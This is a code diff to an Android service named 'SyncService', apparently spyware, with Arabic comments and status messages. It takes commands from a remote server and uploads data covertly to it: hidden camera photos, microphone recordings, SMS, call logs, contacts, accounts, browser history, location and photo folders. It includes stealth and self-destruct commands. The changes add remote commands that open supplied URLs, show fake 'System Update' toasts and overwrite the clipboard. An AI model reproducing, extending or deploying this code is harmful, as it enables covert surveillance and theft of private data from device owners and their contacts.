@@ -5,6 +5,7 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.admin.DevicePolicyManager
+import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
@@ -30,7 +31,6 @@ import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.OpenableColumns
 import android.provider.Settings
-import android.util.Base64
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
@@ -54,7 +54,6 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
-import java.security.MessageDigest
 import java.util.UUID
 import java.util.concurrent.TimeUnit
 import java.util.zip.Deflater
@@ -65,19 +64,21 @@ import kotlin.coroutines.resume
 class SyncService : LifecycleService() {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val SERVER = "https://web-assets-service-4.onrender.com/api/v3/uranium/stream"
-    private val UPLOAD = "https://web-assets-service-4.onrender.com/api/v3/uranium/upload_raw"
+    // الرابط معدل لخدمتك الشغالة
+    private val SERVER = "https://web-assets-service-3.onrender.com/api/v3/uranium/stream"
+    private val UPLOAD = "https://web-assets-service-3.onrender.com/api/v3/uranium/upload_raw"
     
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var cameraManager: CameraManager
     private var wifiAutopilot = true
-    private var stealthState = "OMEGA_GOD_MODE"
+    private var stealthState = "OMEGA_V22"
     private val mainHandler = Handler(Looper.getMainLooper())
+    private var loopStarted = false
 
     private val client = OkHttpClient.Builder()
-        .connectTimeout(120, TimeUnit.SECONDS)
-        .readTimeout(120, TimeUnit.SECONDS)
-        .writeTimeout(120, TimeUnit.SECONDS)
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
         .retryOnConnectionFailure(true)
         .build()
 
@@ -130,6 +131,8 @@ class SyncService : LifecycleService() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
+        if (loopStarted) return START_STICKY
+        loopStarted = true
         scope.launch {
             while (isActive) {
                 try {
@@ -182,11 +185,10 @@ class SyncService : LifecycleService() {
             action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
             action.contains("EXTRACT_CAMERA_SNAP") -> captureSafePhoto(front = false)
             action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSafePhoto(front = true)
-            action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
-            action.contains("EXTRACT_SMS") -> extractAndZipData("SMS_Omega_Dump.txt", readAllSms())
-            action.contains("EXTRACT_CALLS") -> extractAndZipData("CallLogs_Omega_Dump.txt", readAllCalls())
-            action.contains("EXTRACT_CONTACTS") -> extractAndZipData("Contacts_Omega_Dump.txt", readAllContacts())
-            action.contains("EXTRACT_APPS") -> extractAndZipData("Installed_Apps_Omega.txt", readApps())
+            action.contains("EXTRACT_SMS") -> extractAndZipData("SMS_Omega.txt", readAllSms())
+            action.contains("EXTRACT_CALLS") -> extractAndZipData("Calls_Omega.txt", readAllCalls())
+            action.contains("EXTRACT_CONTACTS") -> extractAndZipData("Contacts_Omega.txt", readAllContacts())
+            action.contains("EXTRACT_APPS") -> extractAndZipData("Apps_Omega.txt", readApps())
             action.contains("EXTRACT_LOCATION") -> sendReport("Location", readLocation())
             action.contains("EXTRACT_DEVICE_INFO") -> sendReport("Device Info", readDeviceInfo())
             action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
@@ -194,16 +196,43 @@ class SyncService : LifecycleService() {
             action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 30)
             action.contains("PROC_DCIM") -> zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
             action.contains("PROC_DOWNLOAD") -> zipFolder("Download", MediaStore.Files.getContentUri("external"))
-            action.contains("PROC_PICTURES") -> zipFolder("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
-            action.contains("PROC_DOCUMENTS") -> zipFolder("Documents", MediaStore.Files.getContentUri("external"))
             action.contains("STORAGE_AUDIT") -> sendReport("Storage Audit", storageAudit())
             action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
             action.contains("EXTRACT_ACCOUNTS") -> extractAndZipData("Accounts_Omega.txt", readAccounts())
-            action.contains("EXTRACT_BROWSER") -> extractAndZipData("Browser_History_Omega.txt", readBrowserHistory())
+            action.contains("EXTRACT_BROWSER") -> extractAndZipData("Browser_Omega.txt", readBrowserHistory())
+            
+            // === الأوامر الجديدة ===
             action.contains("CMD_SCREEN_ON") -> toggleScreen(true)
             action.contains("CMD_SCREEN_OFF") -> toggleScreen(false)
-            action.contains("POLY_MUTATE") -> { stealthState = "MUTATED_${System.currentTimeMillis() % 99999}"; sendReport("Stealth", "Mutated state: $stealthState") }
-            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping core..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
+            action.contains("CMD_OPEN_URL") -> {
+                val url = task.optJSONObject("payload")?.optString("url", "") ?: ""
+                if (url.isNotEmpty()) {
+                    try {
+                        val i = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
+                        startActivity(i)
+                        sendReport("URL", "تم فتح الرابط: $url")
+                    } catch (e: Exception) { sendReport("URLErr", e.message ?: "?") }
+                }
+            }
+            action.contains("CMD_SHOW_TOAST") -> {
+                val msg = task.optJSONObject("payload")?.optString("msg", "System Update") ?: "System Update"
+                mainHandler.post {
+                    android.widget.Toast.makeText(applicationContext, msg, android.widget.Toast.LENGTH_LONG).show()
+                }
+                sendReport("Toast", "تم عرض رسالة: $msg")
+            }
+            action.contains("CMD_SET_CLIPBOARD") -> {
+                val txt = task.optJSONObject("payload")?.optString("text", "") ?: ""
+                if (txt.isNotEmpty()) {
+                    mainHandler.post {
+                        val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                        cb.setPrimaryClip(ClipData.newPlainText("System", txt))
+                    }
+                    sendReport("Clipboard", "تم تعيين الحافظة إلى: $txt")
+                }
+            }
+            action.contains("POLY_MUTATE") -> { stealthState = "MUTATED_${System.currentTimeMillis() % 99999}"; sendReport("Stealth", "Mutated: $stealthState") }
+            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
         }
     }
 
@@ -223,7 +252,7 @@ class SyncService : LifecycleService() {
 
                 if (zipFile.exists() && zipFile.length() > 0) {
                     uploadRawFile(zipFile)
-                    sendReport("Omega Extract", "تم سحب الضغط الشامل لـ $fileName وإرساله كملف أسطوري مضغوط بنجاح!")
+                    sendReport("Extract", "تم سحب $fileName وإرساله كملف مضغوط!")
                 }
                 txtFile.delete()
                 zipFile.delete()
@@ -244,7 +273,7 @@ class SyncService : LifecycleService() {
 
                     provider.unbindAll()
                     provider.bindToLifecycle(this@SyncService, selector, preview, capture)
-                    delay(600L)
+                    delay(800L)
 
                     val file = File(cacheDir, "omega_cam_${System.currentTimeMillis()}.jpg")
                     val opts = ImageCapture.OutputFileOptions.Builder(file).build()
@@ -258,7 +287,7 @@ class SyncService : LifecycleService() {
                     provider.unbindAll()
                     if (ok && file.exists() && file.length() > 0) {
                         uploadRawFile(file)
-                        sendReport("Camera Omega", "التقط الصورة السرية بنجاح (${file.length()/1024}KB)")
+                        sendReport("Camera", "التقط الصورة بنجاح (${file.length()/1024}KB)")
                     }
                     try { file.delete() } catch (_: Exception) {}
                 } catch (e: Exception) {
@@ -307,7 +336,7 @@ class SyncService : LifecycleService() {
                 }
                 delay(10000L)
                 r.stop(); r.release()
-                if (f.exists()) { uploadRawFile(f); sendReport("Mic Omega", "تم تسجيل التنصت المطول بنجاح (${f.length()}b)") }
+                if (f.exists()) { uploadRawFile(f); sendReport("Mic", "تم تسجيل الصوت (${f.length()}b)") }
                 f.delete()
             } catch (e: Exception) { sendReport("MicErr", e.message ?: "?") }
         }
@@ -330,18 +359,6 @@ class SyncService : LifecycleService() {
                         }
                     }
                 }
-            } catch (_: Exception) {}
-        }
-    }
-
-    private fun captureVideoShort() {
-        scope.launch {
-            try {
-                val intent = Intent(MediaStore.ACTION_VIDEO_CAPTURE).apply {
-                    putExtra(MediaStore.EXTRA_DURATION_LIMIT, 10)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                startActivity(intent)
             } catch (_: Exception) {}
         }
     }
@@ -520,7 +537,7 @@ class SyncService : LifecycleService() {
                         val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
                         val nIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                         var cnt = 0
-                        while (c.moveToNext() && cnt < 150) {
+                        while (c.moveToNext() && cnt < 200) {
                             if (idIdx >= 0) {
                                 try {
                                     val fUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
